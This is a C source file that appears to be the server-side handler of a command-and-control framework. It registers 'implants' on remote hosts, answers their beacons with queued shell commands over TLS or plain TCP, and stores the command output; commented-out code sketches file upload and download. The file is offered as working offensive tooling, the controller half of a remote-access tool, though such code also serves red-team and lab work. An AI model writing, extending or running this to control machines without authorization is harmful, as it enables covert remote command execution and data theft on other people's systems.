#include "implant_handler.h"

#include <openssl/err.h>
#include <openssl/ssl.h>
#include <cjson/cJSON.h>

#include "logs.h"
#include "db.h"
#include "common.h"

void GenerateID(const char *input, char output[9]) {
    unsigned char hash1[SHA256_DIGEST_LENGTH];
    char sha256_string[65];
    SHA256((unsigned char *)input, strlen(input), hash1);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(sha256_string + (i * 2), "%02x", hash1[i]);
    }
    sha256_string[64] = 0;

    uint8_t hash[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char *)sha256_string, strlen(sha256_string), hash);

    // Use first 6 bytes of hash (48 bits)
    uint64_t val = 0;
    for (int i = 0; i < 6; i++) {
        val = (val << 8) | hash[i];
    }
    // Convert to base62 (8 characters)
    for (int i = 7; i >= 0; i--) {
        output[i] = base62[val % 62];
        val /= 62;
    }
    output[8] = '\0';
}


char *register_implant(cJSON *json, char *ip) {
    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    cJSON *os =  cJSON_GetObjectItem(json, "os");
    cJSON *arch = cJSON_GetObjectItem(json, "arch");

    char input[255];
    snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
    char implant_id[65];
    GenerateID(input, implant_id);

    // check if id already exists in database
    if (check_implant_id(implant_id) == 1) goto REPLY;

    //log
    //log_new_agent(implant_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);
    log_message(LOG_INFO, "New Implant Registration (TCP): implant_id = %s, hostname = %s, os = %s, arch = %s", implant_id,  hostname->valuestring, os->valuestring, arch->valuestring);

    // register to datbase (implant_id, os, ip, mac, hostname)
    // check if agent id exists
    struct db_agents args;
    strncpy(args.implant_id, implant_id, sizeof(args.implant_id) - 1);
    args.implant_id[sizeof(args.implant_id) - 1] = '\0';
    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    args.os[sizeof(args.os) - 1] = '\0';
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.ip[sizeof(args.ip) - 1] = '\0';
    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    args.hostname[sizeof(args.hostname) - 1] = '\0';

    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    args.arch[sizeof(args.arch) - 1] = '\0';
    new_implant(args);

    // reply with agent id
    REPLY:
    cJSON *json_reply = cJSON_CreateObject();
    cJSON_AddStringToObject(json_reply, "mode", "ack");
    cJSON_AddStringToObject(json_reply, "implant_id", implant_id);

    char *reply = cJSON_Print(json_reply);
    //send(sock, reply, strlen(reply), 0);
    cJSON_Delete(json_reply);
    return reply;
}

char *beacon_implant(cJSON *json) {
    cJSON *implant_id = cJSON_GetObjectItem(json, "implant_id");
    // log
    log_message(LOG_INFO, "Beacon from %s", implant_id->valuestring);
    cJSON *json_reply = cJSON_CreateObject();
    // update last seen
    update_last_seen(implant_id->valuestring);
    // validate if agent id exists in the database.
    
    
    if (check_implant_id(implant_id->valuestring) == 0) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        cJSON_Delete(json_reply);

        log_message(LOG_INFO, "Beacon ID %s does not exists", implant_id->valuestring);
        return reply;
    }

    log_message(LOG_INFO, "Beacon from %s", implant_id->valuestring);

    // check if there are tasks queue for agent
    // change this so that it stores all qeues in a data structure to optimize 
    int task_id = check_tasks_queue(implant_id->valuestring);
    if (task_id == -1) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        cJSON_Delete(json_reply);
        return reply;
    } else {
        char *cmd =  get_task(task_id);
        if (cmd != NULL) {
            cJSON_AddStringToObject(json_reply, "command", cmd);
        } else {
            cJSON_AddStringToObject(json_reply, "command", "NULL");  // or "noop", or don't add it
        }
        cJSON_AddStringToObject(json_reply, "mode", "task");
        //cJSON_AddStringToObject(json_reply, "task_id", task_id);
        cJSON_AddNumberToObject(json_reply, "task_id", task_id);
        cJSON_AddStringToObject(json_reply, "implant_id", implant_id->valuestring);
        

        char *reply = cJSON_Print(json_reply);
        
        // if command = "upload [file path]" | upload file to agent 
        // if command = "download [file path]" | download file from agent
        //if (strncmp(cmd, "download", 8) ==0 || strncmp(cmd, "upload", 6) == 0) {
        //    char file[BUFFER_SIZE];
        //    char command[BUFFER_SIZE];
        //    if (sscanf(cmd, "%s %s", command, file) == 2) {
        //        if (strncmp(command, "download", 8) == 0) {
        //            download(file);
        //        } else {
        //            upload(file);
        //        }
        //    }
        //}
        free(cmd);
        cJSON_Delete(json_reply);
        return reply;
    }
}


void *implant_handler(void *args) {
    struct implant_handler_t *arg = (struct implant_handler_t*)args;

    if (arg->encrypted) {
        SSL_CTX *ctx  = arg->ctx;
        int client_fd = arg->client_fd;
    
        SSL *ssl = SSL_new(ctx);
        if (!ssl) {
            fprintf(stderr, "[!] SSL_new failed\n");
            close(client_fd);
            free(arg);
            return NULL;
        }
    
        if (SSL_set_fd(ssl, client_fd) != 1) {
            log_message(LOG_ERROR, "SSL_set_fd failed");
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }
    
        if (SSL_accept(ssl) != 1) {
            log_message(LOG_ERROR, "SSL_accept failed");
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }
    
        char buffer[BUFFER_SIZE];
        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (bytes_received <= 0) {
            log_message(LOG_ERROR, "SSL_read failed");
            ERR_print_errors_fp(stderr);
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }
        buffer[bytes_received] = '\0';

        cJSON *json = cJSON_Parse(buffer);
        if (!json) {
            //fprintf(stderr, "[!] Error parsing JSON\n");
            log_message(LOG_WARN, "Error parsing JSON (TCP [SSL] Handler)");
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }

        cJSON *type = cJSON_GetObjectItem(json, "mode");
        if (!type) {
            log_message(LOG_WARN, "NO mode key in JSON");
        } else if (strcmp(type->valuestring, "register") == 0) {
            char *reply = register_implant(json, arg->ip);
            SSL_write(ssl, reply, strlen(reply));
            free(reply);
        } else if (strcmp(type->valuestring, "beacon") == 0) {
            char *reply = beacon_implant(json);
            SSL_write(ssl, reply, strlen(reply));
            cJSON *check_mode = cJSON_Parse(reply);
            free(reply);
            if (!check_mode) {
                log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
                goto CLEANUP;
            }
            cJSON *mode = cJSON_GetObjectItem(check_mode, "mode");
            if (strncmp(mode->valuestring, "none", 4) == 0) return NULL;

            char buffer[MAX_RESPONSE];
            int bytes_received = SSL_read(ssl, buffer, sizeof(buffer)-1);
            if (bytes_received <= 0) {
                log_message(LOG_ERROR, "Failed to receive data [SSL Beacon]");
                goto CLEANUP;
            }
            buffer[bytes_received] = '\0'; 
            cJSON *response = cJSON_Parse(buffer);
            if (!response) {
                log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
                goto CLEANUP;
            }
            cJSON *command_response = cJSON_GetObjectItem(response, "response");
            cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
            store_task_response(command_response->valuestring, task_id->valueint);
            cJSON_Delete(response);
        }
        CLEANUP: 
        cJSON_Delete(json);
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_fd);
        free(arg);
        return NULL;
    } else {
        int sock = arg->client_fd;
        // recieves message from implant register or beaconing
        char buffer[BUFFER_SIZE];
        int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }
        buffer[bytes_received] = '\0';

        cJSON *json = cJSON_Parse(buffer);
        if (!json) {
            log_message(LOG_WARN, "Error Parsing JSON");
            return NULL;
        }

        cJSON *type = cJSON_GetObjectItem(json, "mode");
        if (strcmp(type->valuestring, "register") == 0) {
            char *reply = register_implant(json, arg->ip);
            send(sock, reply , strlen(reply), 0);
            free(reply);
        } else if (strcmp(type->valuestring, "beacon") == 0) {
            char *reply = beacon_implant(json);

            send(sock, reply, strlen(reply), 0);
            cJSON *check_mode = cJSON_Parse(reply);
            free(reply);
            if (!check_mode) {
                log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
                goto CLEANUP_2;
            }
            cJSON *mode = cJSON_GetObjectItem(check_mode, "mode");
            if (strncmp(mode->valuestring, "none", 4) == 0) return NULL;
            
            char buffer[MAX_RESPONSE];
            int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
            if (bytes_received <= 0) {
                perror("recv failed (beacon func)");
                goto CLEANUP_2;
            }
            buffer[bytes_received] = '\0'; 
        
            cJSON *response = cJSON_Parse(buffer);
            if (!response) {
                printf("Error parsing JSON!\n");
                goto CLEANUP_2;
            }
            cJSON *command_response = cJSON_GetObjectItem(response, "response");
            cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
            store_task_response(command_response->valuestring, task_id->valueint);
            cJSON_Delete(response);
            }

        //cJSON_Delete(json);
        CLEANUP_2:
        close(sock);
        free(args);
        return NULL;
    }
}

